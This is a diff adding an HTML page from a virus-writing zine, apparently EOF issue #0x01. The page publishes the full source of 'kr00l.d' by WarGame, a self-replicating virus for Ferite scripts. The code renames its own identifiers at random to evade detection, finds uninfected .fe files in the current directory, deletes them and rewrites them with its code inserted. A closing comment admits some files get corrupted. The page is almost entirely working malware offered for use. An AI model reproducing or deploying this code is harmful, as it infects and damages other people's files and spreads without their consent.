@@ -1,0 +1,16 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: WarGame/EOF || <a style="text-decoration: none" href="../mainmenu/sources.htm"><span style="text-decoration: none">Back to sources</span></a> || <a style="text-decoration: none" target="_blank" href="../binsrc/WarGame/Kr00ld"><span style="text-decoration: none; color: #BFBF88">View project folder</span></a> || <hr></pre>
+<pre>
+eval('uses &quot;filesystem&quot;,&quot;sys&quot;,&quot;regexp&quot;,&quot;math&quot;,&quot;string&quot;,&quot;date&quot;;function Is_Infected(string flllll) { string stllll = File.open(flllll).toString(); if(String.index(stllll,&quot;kr00l.d by [WarGame,#eof]&quot;) != -1) {return 1;} else {return 0;}} function llllll() {return 65; } function rndddd(number sd) { Math.srand(sd); return String.sprintf(&quot;%c%c%c%c%c%c&quot;,((Math.rand()%10)+llllll()),((Math.rand()%20)+llllll()),((Math.rand()%11)+llllll()),((Math.rand()%9)+llllll()),((Math.rand()%14)+llllll()),((Math.rand()%16)+llllll()));} string signature = &quot;kr00l.d by [WarGame,#eof]&quot;;string fppppp = &quot;&quot;;string my_code = &quot;&quot;;object prrrrr =  File.open(Sys.scriptName());string origgg = &quot;&quot;;object dirrrr = new Directory(&quot;.&quot;); while(String.index((my_code = prrrrr.readln()),signature) == -1) {} if(1) { my_code = Regexp.replaceAll(&quot;signature&quot;,my_code,rndddd(Date.now()+1989)); my_code = Regexp.replaceAll(&quot;Is_Infected&quot;,my_code,rndddd(Date.now()+1975)); my_code = Regexp.replaceAll(&quot;my_code&quot;,my_code,rndddd(Date.now()+2006)); my_code = Regexp.replaceAll(&quot;llllll&quot;,my_code,rndddd(Date.now()+1900)); my_code = Regexp.replaceAll(&quot;flllll&quot;,my_code,rndddd(Date.now()+1930)); my_code = Regexp.replaceAll(&quot;stllll&quot;,my_code,rndddd(Date.now()+1910)); my_code = Regexp.replaceAll(&quot;dirrrr&quot;,my_code,rndddd(Date.now()+1920)); my_code = Regexp.replaceAll(&quot;fppppp&quot;,my_code,rndddd(Date.now()+1950)); my_code = Regexp.replaceAll(&quot;origgg&quot;,my_code,rndddd(Date.now()+1970)); my_code = Regexp.replaceAll(&quot;prrrrr&quot;,my_code,rndddd(Date.now()+1890)); my_code = Regexp.replaceAll(&quot;rndddd&quot;,my_code,rndddd(Date.now()+1800)); } while((fppppp = dirrrr.getEntry()) != &quot;&quot;) { if(String.index(Sys.scriptName(),fppppp) == -1 &amp;&amp; String.index(fppppp,&quot;.fe&quot;) != -1) {  if(!Is_Infected(fppppp)) { origgg = File.open(fppppp).toString(); File.remove(fppppp); origgg = Regexp.replace(&quot;}&quot;,origgg,&quot;\n&quot; + my_code+&quot;}\n&quot;); File.create(fppppp).writeln(origgg); } } }');
+
+
+
+
+
+
+//  Evolution of kr00l.c with silly epo and a better poly ... its name is kr00l.d ... by [WarGame,#eof]
+//  Note: Some files get corrupted or cannot be infected ( but this happens rarely )
+</pre></body></html>
